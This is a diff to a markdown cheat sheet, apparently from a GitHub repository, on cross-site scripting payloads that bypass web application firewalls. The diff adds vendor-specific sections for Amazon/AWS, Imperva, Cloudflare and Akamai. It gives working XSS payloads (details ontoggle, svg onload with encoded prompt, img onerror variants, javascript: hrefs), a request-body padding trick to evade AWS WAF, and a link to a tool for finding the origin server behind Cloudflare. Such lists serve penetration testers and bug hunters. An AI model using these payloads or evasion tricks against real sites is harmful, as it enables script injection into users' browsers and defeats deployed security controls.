@@ -422,19 +422,41 @@ _http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoA
 ```
 ## Bypass WAF
 
-### Bypass AWS Post Based XSS
+### Bypass Amazon 
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="250px">
+
+Noclick
+```html
+<details/open/id="&quot;"ontoggle=[JS]>
+```
+
+#### Bypass AWS Post Based XSS
 ``Adding 8192 "A" before your payload allow you to bypass AWS WAF for POST request``
 
 ![image](https://github.com/Edr4/XSS-Bypass-Filters/assets/69597623/80288b44-4ca7-46e8-be0d-c74b47b61d17)
 
 https://kloudle.com/blog/the-infamous-8kb-aws-waf-request-body-inspection-limitation/
 
+### Bypass Imperva & Incapsula 
+
+<img src="https://github.com/Edr4/XSS-Bypass-Filters/assets/69597623/87b580d0-47df-4ff1-a3d4-df741f42700f" width="250px">
+
+Noclick
+```html
+<details/open/id="&quot;"ontoggle=[JS]>
+```
+
 ### Bypass Cloudflare
 
-No click
+<img src="https://github.com/Edr4/XSS-Bypass-Filters/assets/69597623/829ee19e-868f-4390-877a-255f3f1ffbe6" width="250px">
+
+Noclick
 ```html
 <img//////src=x oNlY=1 oNerror=alert('xxs')//
 <img src=x on onerror=alert()>
+<img/ignored=()%0Asrc=x%0Aonerror=prompt(1)>
+<svg onload=prompt%26%230000000040document.domain)>
 ```
 Href Bypass
 ```
@@ -444,10 +466,22 @@ Href Bypass
 - Identify server origin
 https://github.com/gwen001/cloudflare-origin-ip
 
-### Bypass Akamai 
+### Bypass Akamai
+
+
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8b/Akamai_logo.svg/2560px-Akamai_logo.svg.png" width="250px">
+
+No click
+```
+<details open id="' &quot;'"ontoggle=[JS]>
+```
+
+Click
 ```
 <math><edra href=Ja&Tab;vascript&colon;console.error(1)>HERE</edra></math>
 ```
+
+
 
 ### Cookie Bomb
 Can be used to demonstrate the fact of put "low" Accessibility in a CVSS
